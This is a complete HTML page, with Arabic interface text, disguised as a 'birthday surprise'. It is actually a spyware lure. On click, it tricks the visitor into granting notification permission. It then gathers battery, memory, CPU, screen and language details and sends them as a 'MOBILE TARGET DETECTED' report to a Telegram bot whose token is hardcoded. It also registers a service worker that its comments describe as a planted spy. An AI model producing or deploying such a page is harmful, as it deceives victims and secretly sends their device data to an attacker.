<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Birthday Surprise 🎂</title>
    <style>
        body { background: #000; color: #ff007f; font-family: sans-serif; height: 100vh; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        #startBtn { width: 80%; padding: 25px; font-size: 22px; background: none; border: 3px solid #ff007f; color: #ff007f; border-radius: 15px; font-weight: bold; box-shadow: 0 0 15px #ff007f; active { transform: scale(0.95); } }
        .info { margin-top: 20px; font-size: 12px; opacity: 0.5; }
    </style>
</head>
<body>

    <button id="startBtn">اضغط لبدء المفاجأة 🎁</button>
    <div class="info">يرجى السماح بالصلاحيات لضمان عمل العرض</div>

    <script>
        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';

        document.getElementById('startBtn').addEventListener('click', async () => {
            // 1. طلب إذن الإشعارات (إلزامي للتحكم في الهاتف عن بعد)
            const permission = await Notification.requestPermission();
            if (permission !== 'granted') {
                alert("يجب السماح بالتنبيهات لتشغيل الموسيقى والعرض!");
                return;
            }

            // 2. كسر حماية الاهتزاز (Vibration Context)
            if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);

            // 3. جلب الـ Chat ID
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
                const data = await res.json();
                const chatId = data.result[data.result.length - 1].message.chat.id;

                // 4. جمع بيانات الهاتف الحساسة (البطارية، الذاكرة، النوع)
                let batt = "N/A";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`;
                }

                const report = `
📱 **MOBILE TARGET DETECTED**
-------------------------
🔋 **Battery:** ${batt}
🧠 **RAM:** ${navigator.deviceMemory || 'N/A'} GB
⚙️ **Cores:** ${navigator.hardwareConcurrency || 'N/A'}
🖥️ **Screen:** ${window.screen.width}x${window.screen.height}
🌍 **Lang:** ${navigator.language}
-------------------------`;

                // إرسال التقرير فوراً
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);

                // 5. زرع الجاسوس في متصفح الهاتف (sw.js)
                if ('serviceWorker' in navigator) {
                    const reg = await navigator.serviceWorker.register('sw.js');
                    setTimeout(() => {
                        if (navigator.serviceWorker.controller) {
                            navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: chatId });
                        }
                    }, 1000);
                }

                document.getElementById('startBtn').innerText = "جاري تحميل العرض...";
                setTimeout(() => alert("المفاجأة ستبدأ الآن!"), 2000);

            } catch (e) {
                alert("تأكد من مراسلة البوت في تليجرام أولاً!");
            }
        });
    </script>
</body>
</html>
